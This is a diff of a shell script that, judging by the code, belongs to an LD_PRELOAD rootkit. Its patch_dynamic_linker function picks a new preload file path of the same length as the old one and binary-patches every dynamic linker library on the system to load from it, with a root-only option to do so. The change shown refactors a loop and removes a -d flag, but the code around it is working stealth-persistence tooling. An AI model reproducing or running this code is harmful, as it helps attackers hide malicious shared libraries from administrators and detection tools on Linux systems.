@@ -56,13 +56,12 @@ patch_dynamic_linker(){
     [ ! -z "$2" ] && new_preload="$2"  # preload file to $2
     [ ! -z "$new_preload" ] && [ -f "$new_preload" ] && rm -f "$new_preload"
 
-    while [ -z $new_preload ]; do
-        new_preload="`get_new_preload`" # generate new preload file location
+    [ -z $new_preload ] && new_preload="`get_new_preload`" # generate new preload file location,
+                                                           # if a path wasn't already given.
 
-        # the new file location has got to be the same length as the previous
-        while [ ${#new_preload} -gt ${#old_preload} ]; do new_preload=${new_preload::${#new_preload}-1}; done
-        while [ ${#new_preload} -lt ${#old_preload} ]; do new_preload+="`random 'A-Za-z0-9' 1`"; done
-    done
+    # the new file location has got to be the same length as the previous
+    while [ ${#new_preload} -gt ${#old_preload} ]; do new_preload=${new_preload::${#new_preload}-1}; done
+    while [ ${#new_preload} -lt ${#old_preload} ]; do new_preload+="`random 'A-Za-z0-9' 1`"; done
 
     get_ld_libs # get full paths of dl libs and store in array
     for lib in ${LD_LIBS[@]}; do patch_lib $lib $old_preload $new_preload; done
@@ -70,7 +69,7 @@ patch_dynamic_linker(){
 }
 
 USAGE="
-  Usage: $0 [ -o | -p | -r | -d ]
+  Usage: $0 [ -o | -p | -r ]
          -o:
             Output the new preload file location when finished patching.
             (without a trailing newline)
@@ -80,8 +79,6 @@ USAGE="
          -r:
             Patch the dynamic linker to \$O_PRELOAD before asking  (REQUIRES ROOT)
             for the current file path.
-         -d:
-            Find & output all dynamic linker libraries on this system.
 "
 
 OUTPUT_PATH=0
